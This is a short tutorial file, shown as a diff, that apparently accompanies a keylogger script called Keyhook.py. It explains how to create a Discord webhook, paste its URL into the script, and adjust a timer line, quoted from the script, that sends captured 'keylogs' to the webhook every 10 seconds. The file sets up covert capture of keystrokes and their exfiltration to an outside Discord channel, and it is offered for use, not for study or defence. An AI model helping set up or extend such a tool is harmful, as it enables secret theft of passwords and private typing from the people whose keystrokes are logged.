@@ -1,0 +1,17 @@
+Tutorial
+
+1. Open Discord / log in to your account.  
+2. Select the server where you are the owner in / where you want to create a webhook.  
+3. Right-click the desired text channel and click Edit Channel or the gear icon.  
+4. Go to Integrations > Webhooks.  
+5. Click Create Webhook.  
+6. Optional : Customize the webhook (name, avatar, and channel).  
+7. Click Copy Webhook URL. 
+8. Save your webhook by clicking Save Changes.
+9. Open Keyhook.py in Visual Studio Code, go to line 7
+and replace 'Your webhook here' with your actual Discord webhook URL you copied from earlier.
+10. The code will work and send it to your webhook (in the channel)
+
+MISC:
+You can modify delay seconds in line 42 by replacing 10 with your choice. I put 10 so it sends every 10 seconds.
+ threading.Timer(10, send_keylogs).start()
